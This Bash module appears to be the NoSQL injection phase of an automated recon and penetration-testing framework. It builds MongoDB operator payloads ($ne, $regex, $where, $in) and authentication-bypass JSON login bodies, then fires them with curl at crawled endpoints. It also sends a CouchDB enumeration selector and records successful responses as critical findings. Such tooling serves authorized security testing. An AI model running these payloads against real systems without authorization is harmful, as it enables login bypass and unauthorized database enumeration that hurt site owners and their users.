#!/bin/bash
# NoSQL injection detection (MongoDB, CouchDB), operator injection, authentication bypass

nosql_injection_phase() {
    local domain="$1"
    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    local nosql_dir="$output_dir/nosql_injection"
    local crawl_file="$output_dir/crawl/endpoints.txt"
    local params_file="$output_dir/crawl/urls_with_params.txt"

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true
    mkdir -p "$nosql_dir"

    log "INFO" "Starting NoSQL injection testing for $domain"
    py_log "INFO" "nosql_injection_phase started" --phase "nosql_injection" --target "$domain" || true

    # ------------------------------------------------------------------
    # 1. Build target list from crawled endpoints
    # ------------------------------------------------------------------
    local target_endpoints="$nosql_dir/target_endpoints.txt"
    if [ -f "$params_file" ]; then
        cp "$params_file" "$target_endpoints" 2>/dev/null || true
    elif [ -f "$crawl_file" ]; then
        grep -iE "(login|auth|user|admin|api|search|query|find|filter|sort)" "$crawl_file" 2>/dev/null \
            | sort -u > "$target_endpoints" || true
    fi

    local nosql_vulns="$nosql_dir/nosql_vulns.txt"
    local injection_vectors="$nosql_dir/injection_vectors.txt"
    touch "$nosql_vulns" "$injection_vectors"

    # ------------------------------------------------------------------
    # 2. MongoDB operator injection via GET parameters
    # ------------------------------------------------------------------
    if [ -f "$target_endpoints" ] && [ -s "$target_endpoints" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing MongoDB operator injection via GET..."

        cat > "$nosql_dir/nosql_get_payloads.txt" << 'NOSQLGET'
{"$ne":null}
{"$gt":""}
{"$gte":""}
{"$lt":""}
{"$regex":".*"}
{"$exists":true}
{"$in":["admin"]}
{"$nin":[]}
NOSQLGET

        while IFS= read -r endpoint; do
            [ -z "$endpoint" ] && continue
            if [[ "$endpoint" == *"?"* ]]; then
                local base="${endpoint%\?*}"
                local params="${endpoint#*\?}"
                IFS='&' read -ra PARAMS <<< "$params"
                for param in "${PARAMS[@]}"; do
                    local key="${param%=*}"
                    while IFS= read -r payload; do
                        [ -z "$payload" ] && continue
                        local encoded_payload
                        encoded_payload=$(printf '%s' "$payload" | sed 's|/|%2F|g; s|{|%7B|g; s|}|%7D|g; s|"|%22|g; s|:|%3A|g' 2>/dev/null) || continue
                        local test_url="${base}?${key}=${encoded_payload}"
                        local response_code
                        response_code=$(curl -s -o "$nosql_dir/_nosql_resp.tmp" -w "%{http_code}" \
                            --max-time 15 "$test_url" 2>/dev/null) || true
                        if echo "$response_code" | grep -qE "^(200|201)$"; then
                            local body_size
                            body_size=$(wc -c < "$nosql_dir/_nosql_resp.tmp" 2>/dev/null || echo 0)
                            if [ "$body_size" -gt 50 ]; then
                                echo "NOSQL_GET_HIT: $test_url | Param: $key | Payload: $payload | Size: $body_size" >> "$nosql_vulns"
                                echo "GET $test_url Payload=$payload" >> "$injection_vectors"
                            fi
                        fi
                    done < "$nosql_dir/nosql_get_payloads.txt"
                done
            fi
        done < <(head -30 "$target_endpoints")
    fi

    # ------------------------------------------------------------------
    # 3. MongoDB operator injection via POST JSON body
    # ------------------------------------------------------------------
    if [ -f "$target_endpoints" ] && [ -s "$target_endpoints" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing MongoDB operator injection via POST..."

        cat > "$nosql_dir/nosql_post_payloads.json" << 'NOSQLPOST'
{"username":"admin","password":{"$ne":""}}
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":"admin","password":{"$regex":".*"}}
{"$where":"this.password.length > 0"}
{"$or":[{"user":"admin"},{"user":" administrator"}]}
{"username":{"$in":["admin","root","test"]}}
NOSQLPOST

        while IFS= read -r endpoint; do
            [ -z "$endpoint" ] && continue
            # Strip query params for POST target
            local post_url="${endpoint%%\?*}"
            while IFS= read -r payload; do
                [ -z "$payload" ] && continue
                local code
                code=$(curl -s -o "$nosql_dir/_nosql_post_resp.tmp" -w "%{http_code}" \
                    -X POST -H "Content-Type: application/json" \
                    -d "$payload" --max-time 15 "$post_url" 2>/dev/null) || true
                if echo "$code" | grep -qE "^(200|201)$"; then
                    local body
                    body=$(cat "$nosql_dir/_nosql_post_resp.tmp" 2>/dev/null || echo "")
                    if echo "$body" | grep -qiE "(token|session|success|user|admin|welcome)"; then
                        echo "NOSQL_POST_AUTH_BYPASS: $post_url | Payload: $payload" >> "$nosql_vulns"
                        echo "POST $post_url Payload=$payload" >> "$injection_vectors"
                        write_finding "{\"type\":\"nosql_auth_bypass\",\"url\":\"$post_url\",\"payload\":\"$payload\",\"severity\":\"critical\",\"domain\":\"$domain\"}" "$nosql_dir/findings.json" || true
                    fi
                fi
            done < "$nosql_dir/nosql_post_payloads.json"
        done < <(head -20 "$target_endpoints")
    fi

    # ------------------------------------------------------------------
    # 4. CouchDB-specific injection
    # ------------------------------------------------------------------
    if [ -f "$target_endpoints" ] && [ -s "$target_endpoints" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing CouchDB-specific injection..."
        local couchdb_payloads='{"selector":{"$and":[{"_id":{"$ne":null}},{"_id":{"$gt":null}}]}}'

        while IFS= read -r endpoint; do
            [ -z "$endpoint" ] && continue
            local post_url="${endpoint%%\?*}"
            if [[ "$post_url" == *"_find"* ]] || [[ "$post_url" == *"_all_docs"* ]]; then
                local code
                code=$(curl -s -o /dev/null -w "%{http_code}" \
                    -X POST -H "Content-Type: application/json" \
                    -d "$couchdb_payloads" --max-time 15 "$post_url" 2>/dev/null) || true
                if echo "$code" | grep -qE "^(200|201)$"; then
                    echo "COUCHDB_ENUMERATION: $post_url" >> "$nosql_vulns"
                    write_finding "{\"type\":\"nosql_couchdb_enumeration\",\"url\":\"$post_url\",\"severity\":\"high\",\"domain\":\"$domain\"}" "$nosql_dir/findings.json" || true
                fi
            fi
        done < <(head -20 "$target_endpoints")
    fi

    # ------------------------------------------------------------------
    # 5. Summary count
    # ------------------------------------------------------------------
    local vuln_count
    vuln_count=$(wc -l < "$nosql_vulns" 2>/dev/null || echo 0)
    log "INFO" "NoSQL injection testing complete: $vuln_count vulnerabilities found"

    py_log "INFO" "nosql_injection_phase complete" --phase "nosql_injection" --target "$domain" --extra "{\"vulns\":$vuln_count}" || true
    echo "$vuln_count" > "$nosql_dir/count.txt"
}

export -f nosql_injection_phase
